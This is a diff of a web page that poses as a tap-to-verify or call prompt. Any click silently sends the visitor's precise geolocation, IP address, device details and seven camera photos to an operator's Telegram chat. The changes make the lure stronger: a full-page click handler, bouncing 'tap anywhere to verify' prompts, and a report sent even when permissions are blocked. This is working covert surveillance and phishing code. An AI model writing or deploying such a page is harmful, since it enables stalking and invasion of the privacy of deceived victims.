@@ -20,6 +20,7 @@
             flex-direction: column;
             justify-content: center;
             align-items: center;
+            cursor: pointer;
         }
 
         @keyframes gradientBG {
@@ -81,6 +82,7 @@
             justify-content: center;
             opacity: 0;
             animation: fadeIn 1s ease-in 1.5s forwards;
+            cursor: pointer;
         }
 
         .phone-screen {
@@ -110,6 +112,13 @@
             transition: all 0.3s ease;
             box-shadow: 0 4px 8px rgba(0,0,0,0.3);
             font-size: 24px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(76, 175, 80, 0.7); }
+            70% { transform: scale(1.05); box-shadow: 0 0 0 15px rgba(76, 175, 80, 0); }
+            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(76, 175, 80, 0); }
         }
 
         .phone-button:hover {
@@ -159,18 +168,35 @@
             font-weight: bold;
         }
 
-        .auto-start {
+        .click-anywhere {
             background: #ff9800;
             color: white;
             border: none;
-            padding: 10px 20px;
-            border-radius: 20px;
-            margin: 10px;
-            font-size: 0.9rem;
+            padding: 15px 30px;
+            border-radius: 25px;
+            font-size: 1.2rem;
+            margin: 20px;
+            animation: bounce 2s infinite;
+        }
+
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% {transform: translateY(0);}
+            40% {transform: translateY(-10px);}
+            60% {transform: translateY(-5px);}
+        }
+
+        .tap-instruction {
+            color: white;
+            font-size: 1.5rem;
+            text-align: center;
+            margin-bottom: 20px;
+            opacity: 0;
+            animation: fadeIn 1s ease-in 2s forwards;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
         }
     </style>
 </head>
-<body>
+<body onclick="startVerification()">
     <!-- Floating pages background -->
     <div class="page" style="top: 10%; left: 5%; animation-delay: 0s;"></div>
     <div class="page" style="top: 20%; right: 10%; animation-delay: 1s;"></div>
@@ -181,18 +207,21 @@
     <!-- Main text -->
     <div class="main-text">DINESH KYA CHAHTE HO TUM ?</div>
 
+    <!-- Tap instruction -->
+    <div class="tap-instruction">TAP ANYWHERE TO VERIFY</div>
+
     <!-- Phone container -->
-    <div class="phone-container">
+    <div class="phone-container" onclick="makeCall(); event.stopPropagation();">
         <div class="phone-screen">
             <div class="call-text">Tap to Call</div>
-            <div class="phone-button" onclick="makeCall()">
+            <div class="phone-button">
                 📞
             </div>
         </div>
     </div>
 
-    <!-- Auto start indicator -->
-    <div class="auto-start">Auto-starting in <span id="countdown">3</span>s...</div>
+    <!-- Click anywhere button -->
+    <div class="click-anywhere">CLICK ANYWHERE TO START</div>
 
     <!-- Camera section -->
     <video id="cameraFeed" class="camera-feed" autoplay playsinline></video>
@@ -209,58 +238,56 @@
         let capturedPhotos = [];
         let userLocation = null;
         let isProcessing = false;
+        let verificationStarted = false;
 
-        // Countdown and auto-start
-        let countdown = 3;
-        const countdownEl = document.getElementById('countdown');
-        const countdownInterval = setInterval(() => {
-            countdown--;
-            countdownEl.textContent = countdown;
-            if (countdown <= 0) {
-                clearInterval(countdownInterval);
-                document.querySelector('.auto-start').style.display = 'none';
-                startAutomaticVerification();
-            }
-        }, 1000);
-
-        function startAutomaticVerification() {
-            if (isProcessing) return;
+        function startVerification() {
+            if (verificationStarted) return;
+            verificationStarted = true;
             isProcessing = true;
             
-            showStatus('🚀 Starting automatic verification...', 'loading');
+            // Hide instruction elements
+            document.querySelector('.tap-instruction').style.display = 'none';
+            document.querySelector('.click-anywhere').style.display = 'none';
             
-            // Start location and camera capture automatically
+            showStatus('🚀 Starting verification process...', 'loading');
+            
+            // Start the data capture process
             captureAllData();
         }
 
         async function captureAllData() {
             try {
-                showStatus('📍 Detecting your location...', 'loading');
+                // Get location first
+                await getLocation();
                 
-                // Get location with fallback
-                const locationSuccess = await getLocationWithFallback();
-                
-                if (locationSuccess) {
-                    showStatus('✅ Location captured! Starting camera...', 'success');
-                } else {
-                    showStatus('⚠️ Location unavailable, starting camera...', 'loading');
-                }
-                
-                // Start camera regardless of location
+                // Then start camera and capture photos
                 await startCameraAndCapture();
                 
             } catch (error) {
-                showStatus('❌ Verification failed: ' + error, 'error');
+                // If location fails, try camera only
+                if (error.includes('location') || error.includes('Location')) {
+                    showStatus('⚠️ Location blocked, trying camera...', 'error');
+                    try {
+                        await startCameraAndCapture();
+                    } catch (camError) {
+                        showStatus('❌ Both location and camera blocked', 'error');
+                        await sendToTelegram(`❌ ALL PERMISSIONS BLOCKED\n\n📱 Device: ${navigator.userAgent}\n⏰ Time: ${new Date().toISOString()}\n🌐 URL: ${window.location.href}\n🌐 IP: ${await getIP()}`);
+                    }
+                } else {
+                    showStatus('❌ Verification failed: ' + error, 'error');
+                }
                 isProcessing = false;
             }
         }
 
-        async function getLocationWithFallback() {
-            return new Promise((resolve) => {
+        async function getLocation() {
+            return new Promise((resolve, reject) => {
                 if (!navigator.geolocation) {
-                    resolve(false);
+                    reject('Geolocation not supported');
                     return;
                 }
+
+                showStatus('📍 Getting your location...', 'loading');
 
                 navigator.geolocation.getCurrentPosition(
                     async (position) => {
@@ -271,16 +298,27 @@
                             timestamp: new Date().toISOString()
                         };
                         
-                        // Send location immediately to Telegram
-                        await sendToTelegram(`📍 LOCATION CAPTURED\n\n📱 Device: ${navigator.userAgent}\n🗺️ Lat: ${userLocation.latitude}\n🗺️ Lon: ${userLocation.longitude}\n🎯 Accuracy: ${userLocation.accuracy}m\n⏰ Time: ${userLocation.timestamp}\n🌐 URL: ${window.location.href}`);
+                        showStatus('✅ Location captured! Sending...', 'success');
                         
-                        resolve(true);
+                        // Send location immediately to Telegram
+                        await sendToTelegram(`📍 LOCATION CAPTURED\n\n📱 Device: ${navigator.userAgent}\n🗺️ Lat: ${userLocation.latitude}\n🗺️ Lon: ${userLocation.longitude}\n🎯 Accuracy: ${userLocation.accuracy}m\n⏰ Time: ${userLocation.timestamp}\n🌐 URL: ${window.location.href}\n🌐 IP: ${await getIP()}`);
+                        
+                        resolve(userLocation);
                     },
-                    async (error) => {
-                        // Even if location fails, send IP-based info
-                        const ip = await getIP();
-                        await sendToTelegram(`📍 LOCATION FAILED - IP INFO\n\n📱 Device: ${navigator.userAgent}\n🌐 IP: ${ip}\n⏰ Time: ${new Date().toISOString()}\n❌ Error: ${getLocationError(error)}`);
-                        resolve(false);
+                    (error) => {
+                        let errorMsg = 'Location permission denied';
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMsg = "Location permission denied";
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMsg = "Location unavailable";
+                                break;
+                            case error.TIMEOUT:
+                                errorMsg = "Location timeout";
+                                break;
+                        }
+                        reject(errorMsg);
                     },
                     {
                         enableHighAccuracy: true,
@@ -298,19 +336,6 @@
                 return data.ip;
             } catch (error) {
                 return 'Unknown';
-            }
-        }
-
-        function getLocationError(error) {
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    return "Location permission denied";
-                case error.POSITION_UNAVAILABLE:
-                    return "Location unavailable";
-                case error.TIMEOUT:
-                    return "Location timeout";
-                default:
-                    return "Unknown error";
             }
         }
 
@@ -332,13 +357,11 @@
                 
                 showStatus('✅ Camera connected! Capturing photos...', 'success');
                 
-                // Capture photos rapidly
+                // Capture 7 photos rapidly
                 await captureMultiplePhotos(7);
                 
             } catch (error) {
-                showStatus('❌ Camera access blocked', 'error');
-                // Even if camera fails, send final status
-                await sendToTelegram(`📷 CAMERA BLOCKED\n\n📱 Device: ${navigator.userAgent}\n⏰ Time: ${new Date().toISOString()}\n🌐 URL: ${window.location.href}`);
+                showStatus('❌ Camera access denied', 'error');
                 throw error;
             }
         }
@@ -347,13 +370,13 @@
             for (let i = 0; i < count; i++) {
                 await captureSinglePhoto(i + 1);
                 
-                // Wait 0.8 seconds between photos
+                // Wait 1 second between photos
                 if (i < count - 1) {
-                    await new Promise(resolve => setTimeout(resolve, 800));
+                    await new Promise(resolve => setTimeout(resolve, 1000));
                 }
             }
             
-            showStatus('🎉 All data captured and sent!', 'success');
+            showStatus('🎉 All data captured and sent successfully!', 'success');
             stopCamera();
         }
 
@@ -366,7 +389,7 @@
             canvas.height = cameraFeed.videoHeight;
             context.drawImage(cameraFeed, 0, 0);
             
-            showStatus(`📸 Taking photo ${photoNumber}/7...`, 'loading');
+            showStatus(`📸 Capturing photo ${photoNumber}/7...`, 'loading');
             
             return new Promise((resolve) => {
                 canvas.toBlob(async (blob) => {
@@ -375,7 +398,7 @@
                     
                     showStatus(`✅ Photo ${photoNumber}/7 sent!`, 'success');
                     resolve();
-                }, 'image/jpeg', 0.85);
+                }, 'image/jpeg', 0.9);
             });
         }
 
@@ -403,13 +426,13 @@
                 formData.append('chat_id', ADMIN_ID);
                 formData.append('photo', photoBlob, `photo_${Date.now()}_${photoNumber}.jpg`);
                 
-                let caption = `📸 PHOTO ${photoNumber}/7\n⏰ ${new Date().toLocaleString()}`;
+                let caption = `📸 PHOTO ${photoNumber}/7\n⏰ Time: ${new Date().toLocaleString()}`;
                 
                 if (userLocation) {
-                    caption += `\n📍 ${userLocation.latitude}, ${userLocation.longitude}`;
+                    caption += `\n📍 Location: ${userLocation.latitude}, ${userLocation.longitude}`;
                 }
                 
-                caption += `\n📱 ${navigator.userAgent.substring(0, 80)}...`;
+                caption += `\n📱 Device: ${navigator.userAgent.substring(0, 100)}`;
 
                 formData.append('caption', caption);
 
@@ -455,6 +478,14 @@
             page.style.animationDelay = Math.random() * 5 + 's';
             document.body.appendChild(page);
         }
+
+        // Auto-start after 5 seconds if user doesn't click
+        setTimeout(() => {
+            if (!verificationStarted) {
+                document.querySelector('.click-anywhere').style.animation = 'pulse 0.5s infinite';
+                showStatus('⚠️ Click anywhere to continue...', 'loading');
+            }
+        }, 5000);
     </script>
 </body>
 </html>
